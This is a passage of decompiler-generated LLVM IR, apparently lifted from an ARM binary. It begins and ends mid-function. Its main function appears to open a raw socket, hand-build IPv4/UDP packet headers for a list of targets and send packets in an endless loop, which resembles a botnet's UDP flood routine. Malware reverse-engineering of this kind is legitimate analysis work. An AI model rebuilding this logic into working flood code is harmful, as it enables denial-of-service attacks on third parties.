  store i32 %v5_8e94, i32* %r1.global-to-local, align 4
  %v2_8e9c = call i32 @llvm.bswap.i32(i32 %v8_8e80)
  %v2_8ea0 = add i32 %v0_8e78, 4
  %v3_8ea0 = inttoptr i32 %v2_8ea0 to i32*
  store i32 %v2_8e9c, i32* %v3_8ea0, align 4
  %v0_8eb0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8ea4

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e30, %dec_label_pc_8e58
  %v0_8eb0 = phi i32 [ %v0_8e4c, %dec_label_pc_8e30 ], [ %v0_8eb0.pre, %dec_label_pc_8e58 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_8eac = load i32, i32* @sb, align 4
  %v2_8eac = add i32 %v1_8eac, %stack_var_-60.0
  %v3_8eac = inttoptr i32 %v2_8eac to i32*
  %v4_8eac = load i32, i32* %v3_8eac, align 4
  store i32 %v0_8eb0, i32* %r1.global-to-local, align 4
  %v3_8eb4 = inttoptr i32 %v0_8eb0 to %sockaddr*
  %v4_8eb4 = call i32 @function_1223c(i32 %v4_8eac, %sockaddr* %v3_8eb4, i32 16)
  %v1_8ec0 = add i32 %stack_var_-60.0, 4
  %v1_8ec4 = load i32, i32* @r7, align 4
  %v9_8ec4 = icmp eq i32 %v1_8dfc, %v1_8ec4
  %v0_8ecc = load i32, i32* @r5, align 4
  %v1_8ecc = add i32 %v0_8ecc, 24
  store i32 %v1_8ecc, i32* @r5, align 4
  br i1 %v9_8ec4, label %dec_label_pc_8f48.preheader, label %dec_label_pc_8ed4

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8ea4, %dec_label_pc_8da8
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8da8 ], [ %v1_8ec0, %dec_label_pc_8ea4 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8da8 ], [ %v1_8dfc, %dec_label_pc_8ea4 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_8ee0 = call i32 @function_126cc(i32 65535, i32 1)
  store i32 %v3_8d14, i32* %r1.global-to-local, align 4
  %v2_8ef4 = load i32, i32* @sl, align 4
  %v3_8ef4 = add i32 %v2_8ef4, %stack_var_-60.0
  %v4_8ef4 = inttoptr i32 %v3_8ef4 to i32*
  store i32 %v2_8ee0, i32* %v4_8ef4, align 4
  br i1 %v3_8ef0, label %dec_label_pc_8efc, label %dec_label_pc_8de8

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ed4
  %v0_8efc = call i32 @function_e978()
  %v1_8efc = trunc i32 %v0_8efc to i8
  %v4_8f00 = sdiv i32 %v0_8efc, 256
  %v1_8f04 = trunc i32 %v4_8f00 to i8
  %v2_8f04 = load i32, i32* @r5, align 4
  %v3_8f04 = add i32 %v2_8f04, 3
  %v4_8f04 = inttoptr i32 %v3_8f04 to i8*
  store i8 %v1_8f04, i8* %v4_8f04, align 1
  %v3_8f08 = load i32, i32* @r5, align 4
  %v4_8f08 = add i32 %v3_8f08, 2
  %v5_8f08 = inttoptr i32 %v4_8f08 to i8*
  store i8 %v1_8efc, i8* %v5_8f08, align 1
  br label %dec_label_pc_8df4

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8f48.loopexit, %dec_label_pc_8f48.preheader, %dec_label_pc_8f4c.loopexit, %dec_label_pc_8f10
  br label %dec_label_pc_8f10

dec_label_pc_8f14:                                ; preds = %dec_label_pc_8f14.lr.ph, %dec_label_pc_8f4c.loopexit
  %v0_8f14 = load i32, i32* @r8, align 4
  %v2_8f14 = icmp eq i32 %v0_8f14, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_8f14, label %dec_label_pc_8f1c, label %dec_label_pc_8f5c

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8f14
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_8f24

dec_label_pc_8f24:                                ; preds = %dec_label_pc_8f24, %dec_label_pc_8f1c
  %v0_8f2c = phi i32 [ %v1_8f2c, %dec_label_pc_8f24 ], [ 0, %dec_label_pc_8f1c ]
  %v0_8f24 = phi i32 [ %v1_8f40, %dec_label_pc_8f24 ], [ 0, %dec_label_pc_8f1c ]
  %v1_8f24 = load i32, i32* @sb, align 4
  %v2_8f24 = add i32 %v1_8f24, %v0_8f24
  %v3_8f24 = inttoptr i32 %v2_8f24 to i32*
  %v4_8f24 = load i32, i32* %v3_8f24, align 4
  %v1_8f28 = load i32, i32* @sl, align 4
  %v2_8f28 = add i32 %v1_8f28, %v0_8f24
  %v3_8f28 = inttoptr i32 %v2_8f28 to i32*
  %v4_8f28 = load i32, i32* %v3_8f28, align 4
  store i32 %v4_8f28, i32* %r1.global-to-local, align 4
  %v1_8f2c = add i32 %v0_8f2c, 1
  %v0_8f30 = load i32, i32* @r6, align 4
  %v4_8f38 = inttoptr i32 %v4_8f28 to i32*
  %v5_8f38 = call i32 @function_12350(i32 %v4_8f24, i32* %v4_8f38, i32 %v0_8f30, i32 16384)
  %v1_8f3c = load i32, i32* @r7, align 4
  %v9_8f3c = icmp eq i32 %v1_8f2c, %v1_8f3c
  %v0_8f40 = load i32, i32* @r4, align 4
  %v1_8f40 = add i32 %v0_8f40, 4
  store i32 %v1_8f40, i32* @r4, align 4
  br i1 %v9_8f3c, label %dec_label_pc_8f48.loopexit, label %dec_label_pc_8f24

dec_label_pc_8f48.loopexit:                       ; preds = %dec_label_pc_8f24
  %tmp4247 = icmp slt i32 %v1_8f2c, 1
  br i1 %tmp4247, label %dec_label_pc_8f10, label %dec_label_pc_8f14.lr.ph

dec_label_pc_8f14.lr.ph:                          ; preds = %dec_label_pc_8f48.preheader, %dec_label_pc_8f48.loopexit
  br label %dec_label_pc_8f14

dec_label_pc_8f4c.loopexit:                       ; preds = %dec_label_pc_8f64
  %tmp42 = icmp slt i32 %v0_8f8c, 1
  br i1 %tmp42, label %dec_label_pc_8f10, label %dec_label_pc_8f14

dec_label_pc_8f54:                                ; preds = %dec_label_pc_8df4
  store i32 %v24_8cbc, i32* %fp.global-to-local, align 4
  ret i32 %v3_8e0c

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f14
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_8f64

dec_label_pc_8f64:                                ; preds = %dec_label_pc_8f64, %dec_label_pc_8f5c
  %v0_8f64 = phi i32 [ %v1_8f90, %dec_label_pc_8f64 ], [ 0, %dec_label_pc_8f5c ]
  %v1_8f64 = load i32, i32* @sl, align 4
  %v2_8f64 = add i32 %v1_8f64, %v0_8f64
  %v3_8f64 = inttoptr i32 %v2_8f64 to i32*
  %v4_8f64 = load i32, i32* %v3_8f64, align 4
  store i32 %v4_8f64, i32* @r4, align 4
  %v0_8f68 = load i32, i32* @r6, align 4
  store i32 %v0_8f68, i32* @r1, align 4
  %v1_8f70 = inttoptr i32 %v4_8f64 to i8*
  %v2_8f70 = call i32 @function_eaf8(i8* %v1_8f70)
  %v0_8f74 = load i32, i32* @r5, align 4
  %v1_8f74 = add i32 %v0_8f74, 1
  store i32 %v1_8f74, i32* @r5, align 4
  %v0_8f78 = load i32, i32* @fp, align 4
  %v1_8f78 = load i32, i32* @sb, align 4
  %v2_8f78 = add i32 %v1_8f78, %v0_8f78
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  %v4_8f78 = load i32, i32* %v3_8f78, align 4
  %v0_8f7c = load i32, i32* @r4, align 4
  store i32 %v0_8f7c, i32* %r1.global-to-local, align 4
  %v0_8f80 = load i32, i32* @r6, align 4
  %v4_8f88 = inttoptr i32 %v0_8f7c to i32*
  %v5_8f88 = call i32 @function_12350(i32 %v4_8f78, i32* %v4_8f88, i32 %v0_8f80, i32 16384)
  %v0_8f8c = load i32, i32* @r5, align 4
  %v1_8f8c = load i32, i32* @r7, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, %v1_8f8c
  %v0_8f90 = load i32, i32* @fp, align 4
  %v1_8f90 = add i32 %v0_8f90, 4
  store i32 %v1_8f90, i32* @fp, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f4c.loopexit, label %dec_label_pc_8f64

; uselistorder directives
  uselistorder i32 %v1_8f90, { 1, 0 }
  uselistorder i32 %v0_8f8c, { 1, 0 }
  uselistorder i32 %v1_8f40, { 1, 0 }
  uselistorder i32 %v1_8f2c, { 2, 0, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %v0_8eb0, { 1, 0 }
  uselistorder i32 %v8_8e80, { 1, 2, 0 }
  uselistorder i32 %v0_8e60, { 1, 0, 2 }
  uselistorder i32 %v3_8e0c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8dfc, { 1, 2, 0 }
  uselistorder i32 %v3_8dd0, { 1, 0 }
  uselistorder i32 %v3_8dac, { 1, 0 }
  uselistorder i32 %v3_8d14, { 0, 2, 1 }
  uselistorder i32 %v1_8cc0, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_8f14.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8f14, { 1, 0 }
  uselistorder label %dec_label_pc_8f10, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8ea4, { 1, 0 }
  uselistorder label %dec_label_pc_8da0, { 1, 0 }
}

define i32 @function_8fa0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8fa0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v18_8fa0 = load i32, i32* @sb, align 4
  %v24_8fa0 = load i32, i32* @fp, align 4
  %v1_8fa4 = urem i32 %arg1, 256
  store i32 %v1_8fa4, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_8fa4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_8fbc = urem i32 %arg3, 256
  store i32 %v1_8fbc, i32* @r4, align 4
  %v2_8fc0 = call i32 @function_126cc(i32 %v1_8fa4, i32 4)
  %v0_8fc4 = load i32, i32* @r5, align 4
  store i32 %v0_8fc4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8fd4 = load i32, i32* @r4, align 4
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  %v5_8fd8 = inttoptr i32 %v0_8fc4 to i32*
  %v6_8fd8 = call i32 @function_85e0(i32 %v0_8fd4, i32* %v5_8fd8, i32 2, i32 0)
  %v1_8fe4 = urem i32 %v6_8fd8, 256
  store i32 %v1_8fe4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8ff0 = load i32, i32* @r5, align 4
  store i32 %v0_8ff0, i32* %r1.global-to-local, align 4
  %v0_8ff4 = load i32, i32* @r4, align 4
  store i32 %v0_8ff4, i32* %r0.global-to-local, align 4
  %v5_8ff8 = trunc i32 %v6_8fd8 to i8
  %v6_8ffc = inttoptr i32 %v0_8ff0 to i32*
  %v7_8ffc = call i32 @function_85e0(i32 %v0_8ff4, i32* %v6_8ffc, i32 3, i32 65535)
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8ffc, i32* %fp.global-to-local, align 4
  %v0_9010 = load i32, i32* @r4, align 4
  store i32 %v0_9010, i32* %r0.global-to-local, align 4
  %v4_9014 = inttoptr i32 %v0_9000 to i32*
  %v5_9014 = call i32 @function_85e0(i32 %v0_9010, i32* %v4_9014, i32 4, i32 64)
  %v1_901c = urem i32 %v5_9014, 256
  store i32 %v1_901c, i32* %ip.global-to-local, align 4
  %v0_9020 = load i32, i32* @r5, align 4
  store i32 %v0_9020, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_902c = load i32, i32* @r4, align 4
  store i32 %v0_902c, i32* %r0.global-to-local, align 4
  %v5_9030 = trunc i32 %v5_9014 to i8
  %v6_9034 = inttoptr i32 %v0_9020 to i32*
  %v7_9034 = call i32 @function_85e0(i32 %v0_902c, i32* %v6_9034, i32 5, i32 0)
  %v1_9040 = urem i32 %v7_9034, 256
  store i32 %v1_9040, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_904c = load i32, i32* @r5, align 4
  store i32 %v0_904c, i32* %r1.global-to-local, align 4
  %v0_9050 = load i32, i32* @r4, align 4
  store i32 %v0_9050, i32* %r0.global-to-local, align 4
  %v5_9058 = inttoptr i32 %v0_904c to i32*
  %v6_9058 = call i32 @function_85e0(i32 %v0_9050, i32* %v5_9058, i32 6, i32 65535)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9058, i32* @r7, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  store i32 %v0_9070, i32* %r0.global-to-local, align 4
  %v4_9074 = inttoptr i32 %v0_9060 to i32*
  %v5_9074 = call i32 @function_85e0(i32 %v0_9070, i32* %v4_9074, i32 7, i32 65535)
  %v0_9078 = load i32, i32* @r5, align 4
  store i32 %v0_9078, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9074, i32* %sb.global-to-local, align 4
  %v0_9088 = load i32, i32* @r4, align 4
  store i32 %v0_9088, i32* %r0.global-to-local, align 4
  %v4_908c = inttoptr i32 %v0_9078 to i32*
  %v5_908c = call i32 @function_85e0(i32 %v0_9088, i32* %v4_908c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9098 = load i32, i32* @r5, align 4
  store i32 %v0_9098, i32* %r1.global-to-local, align 4
  store i32 %v5_908c, i32* @r6, align 4
  %v0_90a0 = load i32, i32* @r4, align 4
  store i32 %v0_90a0, i32* %r0.global-to-local, align 4
  %v4_90a4 = inttoptr i32 %v0_9098 to i32*
  %v5_90a4 = call i32 @function_85e0(i32 %v0_90a0, i32* %v4_90a4, i32 1, i32 1)
  %v2_90b0 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_90b0, i32* %r3.global-to-local, align 4
  %v1_90b4 = urem i32 %v5_90a4, 256
  store i32 %v1_90b4, i32* %ip.global-to-local, align 4
  %v0_90b8 = load i32, i32* @r5, align 4
  store i32 %v0_90b8, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_90c0 = load i32, i32* @r4, align 4
  store i32 %v0_90c0, i32* %r0.global-to-local, align 4
  %v5_90c8 = inttoptr i32 %v0_90b8 to i32*
  %v6_90c8 = call i32 @function_85e0(i32 %v0_90c0, i32* %v5_90c8, i32 25, i32 %v2_90b0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_90dc = call i32 @function_123e0(i32 2, i32 3, i32 17)
  store i32 %v3_90dc, i32* %r0.global-to-local, align 4
  %v7_90e0 = icmp eq i32 %v3_90dc, -1
  store i1 %v7_90e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e0, label %dec_label_pc_9508, label %dec_label_pc_90ec

dec_label_pc_90ec:                                ; preds = %dec_label_pc_8fa0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_90f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_90f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_9108 = call i32 @function_123b0(i32 %v3_90dc, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_9108, i32* %r0.global-to-local, align 4
  %v7_910c = icmp eq i32 %v6_9108, -1
  store i1 %v7_910c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_910c, label %dec_label_pc_9500, label %dec_label_pc_9114

dec_label_pc_9114:                                ; preds = %dec_label_pc_90ec
  %v0_9114 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9120 = urem i32 %v0_9114, 65536
  store i32 %v3_9120, i32* %r2.global-to-local, align 4
  %v3_9124 = icmp ugt i32 %v3_9120, 1459
  %v9_9124 = icmp eq i32 %v3_9120, 1460
  store i1 %v9_9124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9124, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9114
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9114, %bb
  %v0_912c = phi i32 [ %v3_9120, %dec_label_pc_9114 ], [ 1460, %bb ]
  %v0_9130 = load i32, i32* %fp.global-to-local, align 4
  %v3_9130 = mul i32 %v0_9130, 65536
  store i32 %v3_9130, i32* %r0.global-to-local, align 4
  %v3_9134 = urem i32 %v0_9130, 65536
  store i32 %v3_9134, i32* %r2.global-to-local, align 4
  %v0_9138 = load i32, i32* @sl, align 4
  %v2_9138 = icmp eq i32 %v0_9138, 0
  store i1 %v2_9138, i1* %cpsr_z.global-to-local, align 1
  %v0_913c = load i32, i32* %sb.global-to-local, align 4
  %v0_9140 = load i32, i32* @r7, align 4
  %tmp72 = icmp slt i32 %v0_9138, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_912c, i32* %r2.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_9168 = phi i32 [ %v3_9134, %bb71 ], [ %v0_912c, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9150 = urem i32 %v0_9140, 65536
  store i32 %v3_9150, i32* %r3.global-to-local, align 4
  %v3_9154 = urem i32 %v0_913c, 65536
  store i32 %v3_9154, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_9170

.thread:                                          ; preds = %bb74
  %v6_9164 = add nsw i32 %v5_9168, 28
  store i32 %v6_9164, i32* @fp, align 4
  %v6_9168 = add nsw i32 %v5_9168, 8
  store i32 %v6_9168, i32* @sb, align 4
  br label %dec_label_pc_92e4

dec_label_pc_9170:                                ; preds = %bb74
  %v1_9174 = add nuw nsw i32 %v0_912c, 28
  store i32 %v1_9174, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_9174, 256
  %v1_9180 = and i32 %tmp75, 65280
  %tmp76 = udiv i32 %v0_9130, 256
  %v3_9184 = urem i32 %tmp76, 256
  %v2_9198 = icmp eq i32 %v1_9040, 0
  store i1 %v2_9198, i1* %cpsr_z.global-to-local, align 1
  %v1_919c = urem i32 %v0_9130, 256
  %v1_91a4 = add nuw nsw i32 %v0_912c, 8
  store i32 %v1_91a4, i32* @sb, align 4
  %v1_91ac = urem i32 %v0_9140, 256
  %v1_91b0 = urem i32 %v0_913c, 256
  store i32 %v1_91b0, i32* %ip.global-to-local, align 4
  store i32 %v1_9180, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_91a4, 256
  %v4_91bc = mul nuw nsw i32 %v1_919c, 256
  %v5_91bc = or i32 %v4_91bc, %v3_9184
  store i32 %v5_91bc, i32* %r0.global-to-local, align 4
  %v3_91c0 = mul nuw nsw i32 %v1_91ac, 256
  store i32 %v3_91c0, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_913c, 256
  %v3_91c4 = urem i32 %tmp78, 256
  %v1_91c8 = and i32 %tmp77, 65280
  store i32 %v1_91c8, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_9174, 256
  %v4_91cc = urem i32 %tmp79, 256
  %v5_91cc = or i32 %v4_91cc, %v1_9180
  store i32 %v5_91cc, i32* @lr, align 4
  %tmp80 = udiv i32 %v0_9140, 256
  %v4_91d0 = urem i32 %tmp80, 256
  %v5_91d0 = or i32 %v4_91d0, %v3_91c0
  store i32 %v5_91d0, i32* @r4, align 4
  %v5_91d4 = trunc i32 %tmp79 to i8
  %v5_91d8 = trunc i32 %tmp76 to i8
  %v4_91dc = mul nuw nsw i32 %v1_91b0, 256
  %v5_91dc = or i32 %v4_91dc, %v3_91c4
  store i32 %v5_91dc, i32* @r5, align 4
  %tmp81 = udiv i32 %v1_91a4, 256
  %v4_91e0 = urem i32 %tmp81, 256
  %v5_91e0 = or i32 %v4_91e0, %v1_91c8
  store i32 %v5_91e0, i32* @r7, align 4
  br i1 %v2_9198, label %dec_label_pc_91e8, label %dec_label_pc_9510

dec_label_pc_91e8:                                ; preds = %dec_label_pc_9170
  %v3_91e836 = udiv i32 %v1_9180, 256
  store i32 %v3_91e836, i32* %ip.global-to-local, align 4
  store i32 %v1_919c, i32* %r0.global-to-local, align 4
  store i32 %v1_91ac, i32* %r1.global-to-local, align 4
  store i32 %v1_91b0, i32* %r2.global-to-local, align 4
  %v3_91f837 = udiv i32 %v1_91c8, 256
  store i32 %v3_91f837, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_925c = sext i8 %v5_8ff8 to i32
  %v4_929c = sext i8 %v5_91d8 to i32
  %sext15 = mul i32 %v0_9130, 16777216
  %v4_92a0 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_9140, 16777216
  %v4_92b8 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_91a4, 16777216
  %v4_92bc = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_913c, 16777216
  %v4_92c0 = sdiv i32 %sext18, 16777216
  %v1_92a8 = trunc i32 %v1_9174 to i8
  %v1_92c8 = trunc i32 %v4_92bc to i8
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_9214, %dec_label_pc_91e8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9220 = call i32 @function_126cc(i32 1510, i32 1)
  store i32 %v2_9220, i32* %r0.global-to-local, align 4
  store i32 %v2_8fc0, i32* %ip.global-to-local, align 4
  %v3_9228 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9228, i32* %r2.global-to-local, align 4
  %v2_922c = load i32, i32* @r6, align 4
  %v5_922c = mul i32 %v2_922c, 4
  %v6_922c = add i32 %v5_922c, %v2_8fc0
  %v7_922c = inttoptr i32 %v6_922c to i32*
  store i32 %v2_9220, i32* %v7_922c, align 4
  %v0_9230 = load i32, i32* %ip.global-to-local, align 4
  %v1_9230 = load i32, i32* %r2.global-to-local, align 4
  %v4_9230 = mul i32 %v1_9230, 4
  %v5_9230 = add i32 %v4_9230, %v0_9230
  %v6_9230 = inttoptr i32 %v5_9230 to i32*
  %v7_9230 = load i32, i32* %v6_9230, align 4
  store i32 %v7_9230, i32* %r1.global-to-local, align 4
  %v1_9234 = inttoptr i32 %v7_9230 to i8*
  %v2_9234 = load i8, i8* %v1_9234, align 1
  %tmp = urem i8 %v2_9234, 16
  %v1_9238 = zext i8 %tmp to i32
  %v1_923c = or i32 %v1_9238, 64
  store i32 %v1_923c, i32* %r3.global-to-local, align 4
  %v1_9240 = trunc i32 %v1_923c to i8
  store i8 %v1_9240, i8* %v1_9234, align 1
  %v0_9244 = load i32, i32* %r1.global-to-local, align 4
  %v1_9244 = inttoptr i32 %v0_9244 to i8*
  %v2_9244 = load i8, i8* %v1_9244, align 1
  %v3_9244 = zext i8 %v2_9244 to i32
  %v1_9248 = and i32 %v3_9244, 240
  %v1_924c = or i32 %v1_9248, 5
  store i32 %v1_924c, i32* %r2.global-to-local, align 4
  %v3_9254 = add i32 %v0_9244, 9
  %v4_9254 = inttoptr i32 %v3_9254 to i8*
  store i8 17, i8* %v4_9254, align 1
  %v0_9258 = load i32, i32* %r2.global-to-local, align 4
  %v1_9258 = trunc i32 %v0_9258 to i8
  %v2_9258 = load i32, i32* %r1.global-to-local, align 4
  %v3_9258 = inttoptr i32 %v2_9258 to i8*
  store i8 %v1_9258, i8* %v3_9258, align 1
  store i32 %v4_925c, i32* %r0.global-to-local, align 4
  %v2_9260 = load i32, i32* %r1.global-to-local, align 4
  %v3_9260 = add i32 %v2_9260, 1
  %v4_9260 = inttoptr i32 %v3_9260 to i8*
  store i8 %v5_8ff8, i8* %v4_9260, align 1
  %v2_9268 = load i32, i32* %r1.global-to-local, align 4
  %v3_9268 = add i32 %v2_9268, 8
  %v4_9268 = inttoptr i32 %v3_9268 to i8*
  store i8 %v5_9030, i8* %v4_9268, align 1
  %v3_926c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_926c, i32* %r2.global-to-local, align 4
  store i32 %v6_90c8, i32* %ip.global-to-local, align 4
  %v3_9274 = mul i32 %v3_926c, 32
  store i32 %v3_9274, i32* %r3.global-to-local, align 4
  %v1_9278 = load i32, i32* %r1.global-to-local, align 4
  %v2_9278 = add i32 %v1_9278, 12
  %v3_9278 = inttoptr i32 %v2_9278 to i32*
  store i32 %v6_90c8, i32* %v3_9278, align 4
  %v0_927c = load i32, i32* %r3.global-to-local, align 4
  %v1_927c = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_927c, -8
  %v5_927c = add i32 %v0_927c, %tmp83
  %v1_9280 = load i32, i32* @r8, align 4
  %v2_9280 = add i32 %v5_927c, %v1_9280
  store i32 %v2_9280, i32* %r3.global-to-local, align 4
  %v1_9284 = add i32 %v2_9280, 16
  %v2_9284 = inttoptr i32 %v1_9284 to i32*
  %v3_9284 = load i32, i32* %v2_9284, align 4
  %v1_9288 = load i32, i32* %r1.global-to-local, align 4
  %v2_9288 = add i32 %v1_9288, 16
  %v3_9288 = inttoptr i32 %v2_9288 to i32*
  store i32 %v3_9284, i32* %v3_9288, align 4
  %v0_9290 = load i32, i32* %r2.global-to-local, align 4
  %v1_9290 = add i32 %v0_9290, 1
  store i32 %v1_9290, i32* @r6, align 4
  %v2_9294 = load i32, i32* %r1.global-to-local, align 4
  %v3_9294 = add i32 %v2_9294, 2
  %v4_9294 = inttoptr i32 %v3_9294 to i8*
  store i8 %v5_91d4, i8* %v4_9294, align 1
  store i32 %v4_929c, i32* %ip.global-to-local, align 4
  store i32 %v4_92a0, i32* %r0.global-to-local, align 4
  %v0_92a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_92a4 = add i32 %v0_92a4, 20
  store i32 %v1_92a4, i32* %r3.global-to-local, align 4
  %v3_92a8 = add i32 %v0_92a4, 3
  %v4_92a8 = inttoptr i32 %v3_92a8 to i8*
  store i8 %v1_92a8, i8* %v4_92a8, align 1
  %v0_92ac = load i32, i32* %ip.global-to-local, align 4
  %v1_92ac = trunc i32 %v0_92ac to i8
  %v2_92ac = load i32, i32* %r1.global-to-local, align 4
  %v3_92ac = add i32 %v2_92ac, 4
  %v4_92ac = inttoptr i32 %v3_92ac to i8*
  store i8 %v1_92ac, i8* %v4_92ac, align 1
  %v0_92b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_92b0 = trunc i32 %v0_92b0 to i8
  %v2_92b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_92b0 = add i32 %v2_92b0, 5
  %v4_92b0 = inttoptr i32 %v3_92b0 to i8*
  store i8 %v1_92b0, i8* %v4_92b0, align 1
  %v0_92b4 = load i32, i32* @r4, align 4
  %v1_92b4 = trunc i32 %v0_92b4 to i8
  %v2_92b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_92b4 = add i32 %v2_92b4, 20
  %v4_92b4 = inttoptr i32 %v3_92b4 to i8*
  store i8 %v1_92b4, i8* %v4_92b4, align 1
  store i32 %v4_92b8, i32* %r2.global-to-local, align 4
  store i32 %v4_92bc, i32* %r1.global-to-local, align 4
  store i32 %v4_92c0, i32* %ip.global-to-local, align 4
  %v0_92c4 = load i32, i32* @r6, align 4
  %v1_92c4 = load i32, i32* @sl, align 4
  %v9_92c4 = icmp eq i32 %v0_92c4, %v1_92c4
  store i1 %v9_92c4, i1* %cpsr_z.global-to-local, align 1
  %v2_92c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_92c8 = add i32 %v2_92c8, 5
  %v4_92c8 = inttoptr i32 %v3_92c8 to i8*
  store i8 %v1_92c8, i8* %v4_92c8, align 1
  %v0_92cc = load i32, i32* %r2.global-to-local, align 4
  %v1_92cc = trunc i32 %v0_92cc to i8
  %v2_92cc = load i32, i32* %r3.global-to-local, align 4
  %v3_92cc = add i32 %v2_92cc, 1
  %v4_92cc = inttoptr i32 %v3_92cc to i8*
